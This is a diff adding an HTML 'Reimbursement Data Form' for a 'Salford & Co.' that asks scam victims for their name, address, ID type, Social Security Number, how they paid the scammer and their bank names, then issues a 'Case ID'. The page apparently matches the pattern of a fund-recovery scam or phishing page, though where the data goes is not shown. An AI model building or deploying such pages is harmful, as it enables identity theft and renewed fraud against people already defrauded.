@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+      <link rel="stylesheet" href="/Frontend/Css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Reimbursement Data Form</title>
+  </head>
+  <body>
+    <div id="app">
+      <div class="container">
+        <div class="header">
+          <div class="logo-container">
+            <img src="/Frontend/img/WhatsApp Image 2025-06-19 at 14.04.51_13b0deaf.jpg" alt="Salford & Co. Logo" class="logo" id="logo">
+          </div>
+          <h1 class="main-heading">Reimbursement Data Form</h1>
+          <p class="greeting" id="greeting"></p>
+        </div>
+
+        <!-- Step 1: Personal Information -->
+        <div class="form-step active" id="step1">
+          <div class="form-container">
+            <h2 class="step-title">Personal Information</h2>
+            <form id="personalForm">
+              <div class="input-group">
+                <input type="text" id="fullName" required>
+                <label for="fullName">
+                  <span class="label-text">Full Legal Name</span>
+                  <span class="label-icon">👤</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Enter your complete legal name as it appears on your ID</div>
+              </div>
+
+              <div class="input-group">
+                <input type="email" id="email" required>
+                <label for="email">
+                  <span class="label-text">Email Address</span>
+                  <span class="label-icon">📧</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Your primary email for case updates</div>
+              </div>
+
+              <div class="input-group">
+                <input type="text" id="address" required>
+                <label for="address">
+                  <span class="label-text">Residential Address</span>
+                  <span class="label-icon">🏠</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Complete address including city, state, and ZIP code</div>
+              </div>
+
+              <div class="input-group select-group">
+                <select id="identification" required>
+                  <option value="" disabled selected></option>
+                  <option value="drivers-license">Driver's License</option>
+                  <option value="passport">Passport</option>
+                  <option value="state-id">State ID</option>
+                  <option value="military-id">Military ID</option>
+                  <option value="other">Other Government ID</option>
+                </select>
+                <label for="identification">
+                  <span class="label-text">Primary Identification</span>
+                  <span class="label-icon">🆔</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Select your primary form of identification</div>
+                <div class="select-arrow">▼</div>
+              </div>
+
+              <div class="input-group">
+                <input type="text" id="ssn" maxlength="11" required>
+                <label for="ssn">
+                  <span class="label-text">Social Security Number</span>
+                  <span class="label-icon">🔒</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">XXX-XX-XXXX (Required for identity verification)</div>
+              </div>
+
+              <button type="submit" class="continue-btn">
+                <span class="btn-text">Continue to Incident Details</span>
+                <span class="btn-icon">→</span>
+                <div class="btn-loader"></div>
+                <div class="btn-ripple"></div>
+              </button>
+            </form>
+          </div>
+        </div>
+
+        <!-- Step 2: Incident Details -->
+        <div class="form-step" id="step2">
+          <div class="form-container">
+            <h2 class="step-title"> Scammed Incident Details</h2>
+            <form id="incidentForm">
+              <div class="input-group select-group">
+                <select id="paymentMethod" required>
+                  <option value="" disabled selected></option>
+                  <option value="credit-card">Credit Card</option>
+                  <option value="debit-card">Debit Card</option>
+                  <option value="bank-transfer">Bank Transfer</option>
+                  <option value="wire-transfer">Wire Transfer</option>
+                  <option value="cryptocurrency">Cryptocurrency</option>
+                  <option value="money-order">Money Order</option>
+                  <option value="cash-app">Cash App</option>
+                  <option value="venmo">Venmo</option>
+                  <option value="paypal">PayPal</option>
+                  <option value="other">Other Payment Method</option>
+                </select>
+                <label for="paymentMethod">
+                  <span class="label-text">Payment Method Used</span>
+                  <span class="label-icon">💳</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">How did you send money to the scammer?</div>
+                <div class="select-arrow">▼</div>
+              </div>
+
+              <div class="input-group textarea-group">
+                <textarea id="incidentDetails" rows="4" required></textarea>
+                <label for="incidentDetails">
+                  <span class="label-text">Detailed Incident Report</span>
+                  <span class="label-icon">📝</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Provide a comprehensive explanation of how the scam occurred. Include dates, amounts, and any communication details to help us assist you effectively.</div>
+                <div class="character-counter">
+                  <span id="charCount">0</span>/500 characters
+                </div>
+              </div>
+
+              <div class="input-group textarea-group">
+                <textarea id="bankPreference" rows="3" required></textarea>
+                <label for="bankPreference">
+                  <span class="label-text">Preferred Reimbursement Bank</span>
+                  <span class="label-icon">🏦</span>
+                </label>
+                <div class="input-underline"></div>
+                <div class="floating-placeholder">Please provide the name(s) of your current bank(s) where you would like to receive your reimbursement after successful recovery.</div>
+              </div>
+
+              <button type="submit" class="submit-btn">
+                <span class="btn-text">Generate Case ID</span>
+                <span class="btn-icon">✨</span>
+                <div class="btn-loader"></div>
+                <div class="btn-ripple"></div>
+              </button>
+            </form>
+          </div>
+        </div>
+
+        <!-- Success Modal -->
+        <div class="modal" id="successModal">
+          <div class="modal-content">
+            <div class="success-icon">✓</div>
+            <h2>Case ID Generated Successfully!</h2>
+            <div class="case-id" id="caseId"></div>
+            <p>Please save this Case ID for your records. You will receive further instructions via email within 24-48 hours.</p>
+            <button class="close-btn" onclick="resetForm()">Start New Case</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script type="module" src="/Frontend/JS/main.js"></script>
+  </body>
+</html>
